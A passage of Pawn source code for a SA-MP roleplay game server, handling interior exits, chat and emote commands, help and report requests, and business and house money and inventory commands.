		        SetPlayerFacingAngle(playerid, 359.8550);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 6);
			}
			else if(HouseInfo[idx][hLevel] == 4)
			{
				SetPlayerPos(playerid, 260.7436,1237.5563,1084.2578);
		        SetPlayerFacingAngle(playerid, 1.6415);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 9);
			}
			else if(HouseInfo[idx][hLevel] == 5)
			{
				SetPlayerPos(playerid, -42.5742,1405.6521,1084.4297);
		        SetPlayerFacingAngle(playerid, 359.1347);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 8);
			}
			else if(HouseInfo[idx][hLevel] == 6)
			{
				SetPlayerPos(playerid, 2468.6787,-1698.2617,1013.5078);
		        SetPlayerFacingAngle(playerid, 89.1791);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 2);
			}
			else if(HouseInfo[idx][hLevel] == 7)
			{
				SetPlayerPos(playerid, 2365.2183,-1135.4014,1050.8750);
		        SetPlayerFacingAngle(playerid, 359.8550);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 8);
			}
			else if(HouseInfo[idx][hLevel] == 8)
			{
				SetPlayerPos(playerid, 2270.1270,-1210.4855,1047.5625);
		        SetPlayerFacingAngle(playerid, 89.4224);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 10);
			}
			else if(HouseInfo[idx][hLevel] == 9)
			{
				SetPlayerPos(playerid, 2324.4424,-1149.2057,1050.7101);
		        SetPlayerFacingAngle(playerid, 0.7248);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 12);
			}
			else if(HouseInfo[idx][hLevel] == 10)
			{
				SetPlayerPos(playerid, 83.0863,1322.3020,1083.8662);
		        SetPlayerFacingAngle(playerid, 359.5183);
		        SetCameraBehindPlayer(playerid);
		        SetPlayerInterior(playerid, 9);
			}
	        return 1;
		}
	}
	return 1;
}

IRP:exit(playerid, var[])
{
	new done, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
    for(new idx=0; idx<MAX_DOORS; idx++) // Dynamic Doors
	{
	    if(!done && IsPlayerInRangeOfPoint(playerid, 2, DoorInfo[idx][dIX], DoorInfo[idx][dIY], DoorInfo[idx][dIZ]) && GetPlayerVirtualWorld(playerid) == DoorInfo[idx][dIVW] && GetPlayerInterior(playerid) == DoorInfo[idx][dIInt])
	    {
	        if(DoorInfo[idx][dCExt])
	        {
	            GameTextForPlayer(playerid, "~w~Loading Objects", 3500, 3);
				TogglePlayerControllable(playerid, 0);
	            SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
	            Player[playerid][pSpawnFreeze] = 1;
	        }
	        Player[playerid][pSpawnFreeze] = 0;
	        SetPlayerInterior(playerid, DoorInfo[idx][dOInt]);
	        SetPlayerVirtualWorld(playerid, DoorInfo[idx][dOVW]);
	        SetPlayerFacingAngle(playerid, DoorInfo[idx][dOA]);
	        SetCameraBehindPlayer(playerid);
	        SetPlayerPos(playerid, DoorInfo[idx][dOX], DoorInfo[idx][dOY], DoorInfo[idx][dOZ]);
	        done = 1;
	    }
	}
	if(IsPlayerInRangeOfPoint(playerid, 2, 243.9951,304.9418,999.1484) || IsPlayerInRangeOfPoint(playerid, 2, 2259.6702,-1135.8542,1050.6328) || IsPlayerInRangeOfPoint(playerid, 2, 2308.8254,-1212.8070,1049.0234) || IsPlayerInRangeOfPoint(playerid, 2, 260.7436,1237.5563,1084.2578)
	|| IsPlayerInRangeOfPoint(playerid, 2, -42.5742,1405.6521,1084.4297) || IsPlayerInRangeOfPoint(playerid, 2, 2468.6787,-1698.2617,1013.5078) || IsPlayerInRangeOfPoint(playerid, 2, 2365.2183,-1135.4014,1050.8750) || IsPlayerInRangeOfPoint(playerid, 2, 2270.1270,-1210.4855,1047.5625)
	|| IsPlayerInRangeOfPoint(playerid, 2, 2324.4424,-1149.2057,1050.7101) || IsPlayerInRangeOfPoint(playerid, 2, 83.0863,1322.3020,1083.8662)) // Houses
	{
	    new idx;
		idx = GetPlayerVirtualWorld(playerid)-500;
		if(!done && idx < MAX_HOUSES && HouseInfo[idx][hLevel])
		{
			format(string, sizeof(string), "* %s pushes the door and exits the house.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        SetPlayerPos(playerid, HouseInfo[idx][hX], HouseInfo[idx][hY], HouseInfo[idx][hZ]);
	        SetPlayerInterior(playerid, 0);
	        SetPlayerVirtualWorld(playerid, 0);
	        done = 1;
        }
	}
	if(IsPlayerInRangeOfPoint(playerid,2,1544.2185,-1649.5410,-25.5641)) //LSPD
	{
		SetPlayerPos(playerid,1555.1262, -1675.5813, 16.1953);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,2,-2044.7102,-187.0223,991.5363)) //Prison
	{
		SetPlayerPos(playerid,806.7476,-2431.9968,14.0009);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,2,1522.7655,-1584.8519,-28.5641)) //LSPDGARAGE
	{
		SetPlayerPos(playerid,1568.5692,-1691.3297,5.8906);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}

	if(IsPlayerInRangeOfPoint(playerid,2,389.5916,173.6717,1008.3828)) //CityHall
	{
		SetPlayerPos(playerid,1480.9678,-1771.8704,18.7958);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,772.111999,-3.898649,1000.728820)) //gym
	{
		SetPlayerPos(playerid,2229.9487,-1721.3040,13.5618);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,318.5597,1115.4316,1083.8828)) //SeedsHouse
	{
		if(GetPlayerVirtualWorld(playerid) == 0)
		{
	    	SetPlayerPos(playerid,2165.9492,-1671.1947,15.0732);
	    	SetCameraBehindPlayer(playerid);
	    	SetPlayerInterior(playerid,0);
	    	SetPlayerVirtualWorld(playerid,0);
	    }
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,2352.2483,-1180.9229,1027.9766)) //cocaineLab
	{
		SetPlayerPos(playerid,2351.9326,-1170.6655,28.0747);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,1527.5353,-1586.3845,-25.5641)) //LSPD Roof
	{
		SetPlayerPos(playerid,1564.8611,-1666.2771,28.3956);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,-1694.4518,1035.4573,45.2109)) //Drugs Factory
	{
		SetPlayerPos(playerid,65.4823,-292.5736,1.5781);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,1957.3972,-1134.7617,987.5298)) //DMV Center
	{
		SetPlayerPos(playerid,2045.6598,-1908.0221,13.5469);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,-2653.9673,1390.7808,945.5359)) //All Saints
	{
		SetPlayerPos(playerid,1172.4875,-1323.2266,15.4027);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,2525.4929,1462.0261,7699.5869)) //VIP
	{
		SetPlayerPos(playerid,1831.0460,-1075.4194,23.8367);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	if(IsPlayerInRangeOfPoint(playerid,3.0,2235.7056,2070.3030,100.3772)) //Bank
	{
		SetPlayerPos(playerid,1462.4424,-1011.7301,26.8438);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
    if(IsPlayerInRangeOfPoint(playerid, 2, -27.3025,-57.6649,1003.5469) || IsPlayerInRangeOfPoint(playerid, 2, 207.0638,-139.9965,1003.5078) || IsPlayerInRangeOfPoint(playerid, 2, 285.8044,-85.9956,1001.5229) || IsPlayerInRangeOfPoint(playerid, 2, 493.4252,-24.3061,1000.6797) || IsPlayerInRangeOfPoint(playerid, 2, 834.1631,7.4883,1004.1797) || IsPlayerInRangeOfPoint(playerid, 2, 372.3830,-133.2579,1001.4922)) // market || Clothes Shop || Ammunation || Club || Advertisement Agency || FastFood
	{
	    new idx;
		idx = GetPlayerVirtualWorld(playerid)-100;
		if(!done && idx < MAX_BIZ && BizInfo[idx][bType])
		{
			format(string, sizeof(string), "* %s pushes the door and exits the shop.", GetName(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        SetPlayerPos(playerid, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]);
	        SetPlayerInterior(playerid, 0);
	        SetPlayerVirtualWorld(playerid, 0);
        }
        done = 1;
	}
	if(IsPlayerInRangeOfPoint(playerid, 2, 502.1039,-68.0976,998.7578) || IsPlayerInRangeOfPoint(playerid, 2,  2165.9492,-1671.1947,15.0732) || IsPlayerInRangeOfPoint(playerid, 2, 2807.5747,-1173.9775,1025.5703))
    {
        new idx = GetPlayerVirtualWorld(playerid)-800;
   		if(!done && idx < MAX_FAMILIES && FamInfo[idx][fLevel])
     	{
            SetPlayerPos(playerid, FamInfo[idx][fHQX], FamInfo[idx][fHQY], FamInfo[idx][fHQZ]);
            SetPlayerInterior(playerid, 0);
	        SetPlayerVirtualWorld(playerid, 0);
        }
        done = 1;
   	}
	return 1;
}

IRP:stats(playerid, var[])
{
	if(!Logged(playerid)) return NoLogin(playerid);
	ShowStats(playerid, playerid);
	return 1;
}
IRP:inv(playerid, var[])
{
	if(!Logged(playerid)) return NoLogin(playerid);
	ShowInv(playerid, playerid);
	return 1;
}
IRP:helpme(playerid, var[])
{
    new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pHelper]) return SendClientMessage(playerid, COLOR_GRAD2, "You can't submit a help request as a helper.");
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /helpme [text]");
	if(AntiAdv(playerid, var)) return 1;
	if(HelpTime[playerid] > 0)
	{
	    format(string, sizeof(string), "You need to wait %d more seconds before making a help message again.", HelpTime[playerid]);
		SendClientMessage(playerid, COLOR_GRAD2, string);
		return 1;
	}
	format(string, sizeof(string), "Help Request from {FF6347}[%d] {FFFF91}%s: %s", playerid, GetName(playerid), var);
	SendHelperMessage(COLOR_REPORT, string);
	format(string, sizeof(string), "Help Report from [%d] %s: %s", playerid, GetName(playerid), var);
	Log("Log/Admins/hreport.log", string);
	SendClientMessage(playerid, COLOR_YELLOW, "Your help request has been sent to online helpers.");
	HelpTime[playerid] = 25;
	SetTimerEx("HelpTimer", 1000, false, "i", playerid);
	return 1;
}

IRP:report(playerid, var[])
{
    new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /report [text]");
	if(Player[playerid][pRMute]) return SendClientMessage(playerid, COLOR_GRAD2, "You are muted from the sumbitting any reports.");
	if(AntiAdv(playerid, var)) return 1;
	if(ReportTime[playerid] > 0)
	{
	    format(string, sizeof(string), "You need to wait %d more seconds before making a report message again.", ReportTime[playerid]);
		SendClientMessage(playerid, COLOR_GRAD2, string);
		return 1;
	}
	format(string, sizeof(string), "Report from {FF6347}[%d] {FFFF91}%s: %s", playerid, GetName(playerid), var);
	SendAdminMessage(COLOR_REPORT, string);
	StaffWarn(COLOR_REPORT, string);
	format(string, sizeof(string), "Report from [%d] %s: %s", playerid, GetName(playerid), var);
	Log("Log/Admins/reports.log", string);
	SendClientMessage(playerid, COLOR_YELLOW, "Your report message has been sent to online admins.");
	ReportTime[playerid] = 25;
	SetTimerEx("ReportTimer", 1000, false, "i", playerid);
	return 1;
}


IRP:b(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /b [text] (Local OOC Chat)");
	if(AntiAdv(playerid, var)) return 1;
	format(string, sizeof(string), "%s: (( %s ))", GetName(playerid), var);
	SendNearbyMessage(playerid, 10, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	Log("Log/Players/chat.log", string);
	return 1;
}

IRP:s(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/s)hout [text]");
	if(AntiAdv(playerid, var)) return 1;
	if(Player[playerid][pMasked] == 0)
	{
    	format(string, sizeof(string), "%s shouts: %s", GetName(playerid), var);
    	SendNearbyMessage(playerid, 30, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	}
	else
    {
    	format(string, sizeof(string), "Stranger_1911%d23%d shouts: %s", playerid, playerid+80, var);
    	SendNearbyMessage(playerid, 30, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
    }
	Log("Log/Players/chat.log", string);
	return 1;
}

IRP:l(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/l)ow [text]");
	if(AntiAdv(playerid, var)) return 1;
	if(Player[playerid][pMasked] == 0)
	{
    	format(string, sizeof(string), "%s mumbles: %s", GetName(playerid), var);
    	SendNearbyMessage(playerid, 1.5, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
	}
	else
    {
    	format(string, sizeof(string), "Stranger_1911%d23%d mumbles: %s", playerid, playerid+80, var);
    	SendNearbyMessage(playerid, 1.5, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
    }
	Log("Log/Players/chat.log", string);
	return 1;
}

IRP:w(playerid, var[])
{
    new user, text[128], string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "us[128]", user, text)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/w)hisper [playerid] [text]");
	if(AntiAdv(playerid, var)) return 1;
	if(!Logged(user)) return NoLoginB(playerid);
	if(!strlen(text)) return SendClientMessage(playerid, COLOR_GRAD2, "You haven't entered any text to whisper.");
	if(Player[playerid][pAdmin] >= 2)
	{
    	if(IsPlayerNearPlayer(playerid, user, 1000000000000))
    	{
            if(strlen(Player[playerid][pAccent])) format(string, sizeof(string), "Whisper to %s: %s", GetName(user), text);
	    	else format(string, sizeof(string), "Whisper to %s: %s", GetName(user), text);
	    	SendClientMessage(playerid, COLOR_YELLOW, string);
	    	if(strlen(Player[playerid][pAccent])) format(string, sizeof(string), "Whisper from %s: %s", GetName(playerid), text);
	    	else format(string, sizeof(string), "Whisper from %s: %s", GetName(playerid), text);
	    	SendClientMessage(user, COLOR_YELLOW, string);
	    	return 1;
	    }
	}
	else
	{
        if(IsPlayerNearPlayer(playerid, user, 2))
        {
     		if(Player[playerid][pMasked] == 0)
        	{
             	format(string, sizeof(string), "* %s leans towards %s and whispers in their ears.", GetName(playerid), GetName(user));
        		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
                format(string, sizeof(string), "Whisper to %s: %s", GetName(user), text);
        		SendClientMessage(playerid, COLOR_YELLOW, string);
                format(string, sizeof(string), "Whisper from %s: %s", GetName(playerid), text);
         		SendClientMessage(user, COLOR_YELLOW, string);
        	}
          	else
            {
             	format(string, sizeof(string), "* Stranger_1911%d23%d leans towards %s and whispers in their ears.", playerid, playerid+80, GetName(user));
        		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
                format(string, sizeof(string), "Whisper to %s: %s", GetName(user), text);
        		SendClientMessage(playerid, COLOR_YELLOW, string);
                format(string, sizeof(string), "Whisper from Stranger_1911%d23%d: %s", playerid, playerid+80, text);
         		SendClientMessage(user, COLOR_YELLOW, string);
            }
    		new log[256];
    		format(log, sizeof(log), "%s to %s: %s", GetName(playerid), GetName(user), text);
	    	Log("Log/Players/whisper.log", log);
	    	foreach(Player, i)
    		{
	    	    if(Player[i][pAdmin] >= 1 && Whispers[i] && i != playerid && i != user)
	    	    {
	    	        format(log, sizeof(log), "[BigEar] Whisper: %s to %s: %s", GetName(playerid), GetName(user), text);
		            SendClientMessage(i, COLOR_LIGHTSALMON, log);
		        }
    		}
    	}
    	else
    	{
    	    SendClientMessage(playerid, COLOR_GRAD2, "You are not near that player.");
    	}
	}
	return 1;
}

IRP:me(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /me [action]");
	if(AntiAdv(playerid, var)) return 1;
	if(Player[playerid][pMasked] == 0)
	{
    	format(string, sizeof(string), "* %s %s", GetName(playerid), var);
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	else
    {
    	format(string, sizeof(string), "* Stranger_1911%d23%d %s", playerid, playerid+80, var);
     	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
	return 1;
}

IRP:do(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /me [action]");
	if(AntiAdv(playerid, var)) return 1;
	if(Player[playerid][pMasked] == 0)
	{
    	format(string, sizeof(string), "* %s (( %s ))", var, GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	else
    {
     	format(string, sizeof(string), "* %s (( Stranger_1911%d23%d ))", var,  playerid, playerid+80);
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
	return 1;
}

IRP:bizmessage(playerid, var[])
{
    new string[128], message[128], business;
    new idx = Player[playerid][pBiz];
    new idxx = Player[playerid][pVBiz];
    if(sscanf(var, "ds[128]", business, message))
    {
	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /bizmessage [1-2] [entrance message]");
        return 1;
    }
	switch(business)
	{
    	case 1:
    	{
           if(!Player[playerid][pBiz]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a busines.");
           format(BizInfo[idx][bMessage], 128, "%s", message);
           format(string, sizeof(string), "** You have changed the entrance message of your business.");
           SendClientMessage(playerid, COLOR_WHITE,  string);
		}
		case 2:
    	{
           if(!Player[playerid][pBiz]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a busines.");
           format(BizInfo[idxx][bMessage], 128, "%s", message);
           format(string, sizeof(string), "** You have changed the entrance message of your business.");
           SendClientMessage(playerid, COLOR_WHITE,  string);
		}
	}
    return 1;
}
IRP:vault(playerid, var[])
{
	new value, string[128];
	new idx = Player[playerid][pBiz];
   	if(!Logged(playerid)) return NoLogin(playerid);
    if(!Player[playerid][pBiz] && !Player[playerid][pVBiz]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a busines.");
    if(GetPlayerVirtualWorld(playerid)-100 != idx && !Player[playerid][pVBiz]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside your business.");
    if(GetPlayerVirtualWorld(playerid)-100 != idx && Player[playerid][pVBiz])
	{
		idx = Player[playerid][pVBiz];
	    if(GetPlayerVirtualWorld(playerid)-100 != idx) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside your business.");
	}
	if(sscanf(var, "s[32]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /vault [option]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: withdraw | deposit");
		return 1;
	}
	if(!strcmp(var, "withdraw", false, 8))
	{
	    if(sscanf(var, "s[32]i", var, value))
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /vault withdraw [amount]");
	        format(string, sizeof(string), "Current Vault Money: $%d", BizInfo[idx][bMoney]);
	        SendClientMessage(playerid, COLOR_GRAD2, string);
			return 1;
	    }
	    if(value > BizInfo[idx][bMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have this much money in your business vault.");
        if(value <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "Negative numbers? It's not possible to do that.");
	    BizInfo[idx][bMoney] -= value;
	    GiveZamoraMoney(playerid, value);
	    format(string, sizeof(string), "* %s has withdrawn money from their business vault.", GetName(playerid));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), " You have withdrawn $%d from your business vault, amount left: $%d", value, BizInfo[idx][bMoney]);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	}
	else if(!strcmp(var, "deposit", false, 7))
	{
	    if(sscanf(var, "s[32]i", var, value))
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /vault deposit [amount]");
	        format(string, sizeof(string), "Current Vault Money: $%d", BizInfo[idx][bMoney]);
	        SendClientMessage(playerid, COLOR_GRAD2, string);
			return 1;
	    }
	    if(value > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have this much money on you.");
	    if(value <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "Negative numbers? It's not possible to do that.");
	    BizInfo[idx][bMoney] += value;
	    GiveZamoraMoney(playerid, -value);
	    format(string, sizeof(string), "* %s has deposited money to their business vault.", GetName(playerid));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), " You have deposited $%d to your business vault, current amount: $%d", value, BizInfo[idx][bMoney]);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	}
	return 1;
}

IRP:buyproducts(playerid, var[])
{
	new amount, price, string[128], business;
	new idx = Player[playerid][pBiz];
    new idxx = Player[playerid][pVBiz];
   	if(!Logged(playerid)) return NoLogin(playerid);
    if(!Player[playerid][pBiz] && !Player[playerid][pVBiz]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a business.");
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, -1557.5293,-2723.8181,48.7435)) return SendClientMessage(playerid, COLOR_GRAD2, "You're not at the products company.");
	if(sscanf(var, "di", business, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /buyproducts [1-2] [amount]");
	switch(business)
	{
    	case 1:
    	{
           if(!Player[playerid][pBiz]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a busines.");
           if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid products amount.");
    	   price = amount*250;
           if(Player[playerid][pMoney] < price)
   	       {
        	    format(string, sizeof(string), "You don't have that much money on you. ($%d)", price);
	        	SendClientMessage(playerid, COLOR_GRAD2, string);
          		return 1;
       	   }
       	   if(BizInfo[idx][bProducts]+amount > 500) return SendClientMessage(playerid, COLOR_GRAD2, "Your business can't hold that much products.");
           GiveZamoraMoney(playerid, -price);
           BizInfo[idx][bProducts] += amount;
           Products -= amount;
           format(string, sizeof(string), "* %s has purchased %d products for $%d.", GetName(playerid), amount, price);
       	   SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		}
		case 2:
    	{
           if(!Player[playerid][pVBiz]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a busines.");
           if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid products amount.");
    	   price = amount*250;
           if(Player[playerid][pMoney] < price)
   	       {
        	    format(string, sizeof(string), "You don't have that much money on you. ($%d)", price);
	        	SendClientMessage(playerid, COLOR_GRAD2, string);
          		return 1;
       	   }
       	   if(BizInfo[idxx][bProducts]+amount > 500) return SendClientMessage(playerid, COLOR_GRAD2, "Your business can't hold that much products.");
           GiveZamoraMoney(playerid, -price);
           BizInfo[idxx][bProducts] += amount;
           Products -= amount;
           format(string, sizeof(string), "* %s has purchased %d products for $%d.", GetName(playerid), amount, price);
       	   SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		}
	}
	return 1;
}
IRP:buybiz(playerid, var[])
{
	new string[128], done;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pBiz] && Player[playerid][pVBiz] && Player[playerid][pVIP] >= 4) return SendClientMessage(playerid, COLOR_GRAD2, "You already own two businesses.");
	if(Player[playerid][pBiz] && Player[playerid][pVIP] < 3) return SendClientMessage(playerid, COLOR_GRAD2, "You already own a business.");
	for(new idx=1; idx<MAX_BIZ; idx++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]))
	    {
			if(!strcmp("The State", BizInfo[idx][bOwner], false))
			{
			    if(Player[playerid][pMoney] < BizInfo[idx][bPrice]) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy a business.");
				GiveZamoraMoney(playerid, -BizInfo[idx][bPrice]);
				if(Player[playerid][pBiz]) Player[playerid][pVBiz] = idx;
				else Player[playerid][pBiz] = idx;
			    format(BizInfo[idx][bOwner], 32, "%s", GetAccountName(playerid));
				format(string, sizeof(string), "Business Type: %s\nBusiness Owner: %s\nBusiness Status: %s", RBT(idx), BizInfo[idx][bOwner], RBS(idx));
				UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
				SendClientMessage(playerid, COLOR_INT, " You have successfully bought a business.");
				SendClientMessage(playerid, COLOR_WHITE, " Type /help to view your business commands.");
				format(string, sizeof(string), "%s has bought business id %d.", GetName(playerid), idx);
				Log("Log/Players/business.log", string);
				idx = MAX_BIZ;
				done = 1;
			}
			if(idx == MAX_BIZ-1 && !done)
			{
			    SendClientMessage(playerid, COLOR_GRAD2, "This business is owned by someone else.");
			}
	    }
	    if(idx == MAX_BIZ-1 && !done)
	    {
	        SendClientMessage(playerid, COLOR_GRAD2, "You are not near a buyable business.");
	    }
	}
	return 1;
}




IRP:hwithdraw(playerid, var[])
{
	new string[128], option[32], amount;
	new idx = Player[playerid][pHouse];
   	if(!Logged(playerid)) return NoLogin(playerid);
    if(!Player[playerid][pHouse] && !Player[playerid][pVHouse]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't own a house.");
    if(GetPlayerVirtualWorld(playerid)-500 != idx && !Player[playerid][pVHouse]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside your house.");
    if(GetPlayerVirtualWorld(playerid)-500 != idx && Player[playerid][pVHouse])
	{
		idx = Player[playerid][pVHouse];
	    if(GetPlayerVirtualWorld(playerid)-500 != idx) return SendClientMessage(playerid, COLOR_GRAD2, "You are not inside your house.");
	}
    if(sscanf(var, "s[32]", option))
    {
        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /hwithdraw [item]");
        SendClientMessage(playerid, COLOR_GRAD2, "** [ITEMS]: money | weapon | seed | cocaine | weed");
        format(string, sizeof(string), "** [SAFE]: $%d | %d Weed | %d Cocaine | %d Seed", HouseInfo[idx][hMoney], HouseInfo[idx][hWeed], HouseInfo[idx][hcocaine], HouseInfo[idx][hSeed]);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "** [SAFE]: Weapon 1: %s (%d Ammo) | Weapon 2: %s (%d Ammo) | Weapon 3: %s (%d Ammo)", RWN(HouseInfo[idx][hGun][0]), HouseInfo[idx][hGunAmmo][0], RWN(HouseInfo[idx][hGun][1]), HouseInfo[idx][hGunAmmo][1], RWN(HouseInfo[idx][hGun][2]), HouseInfo[idx][hGunAmmo][2]);
        SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "** [SAFE]: Weapon 4: %s (%d Ammo) | Weapon 5: %s (%d Ammo)", RWN(HouseInfo[idx][hGun][3]), HouseInfo[idx][hGunAmmo][3], RWN(HouseInfo[idx][hGun][4]), HouseInfo[idx][hGunAmmo][4]);
        SendClientMessage(playerid, COLOR_WHITE, string);
		return 1;
    }
    if(!strcmp(option, "money", true, 5))
    {
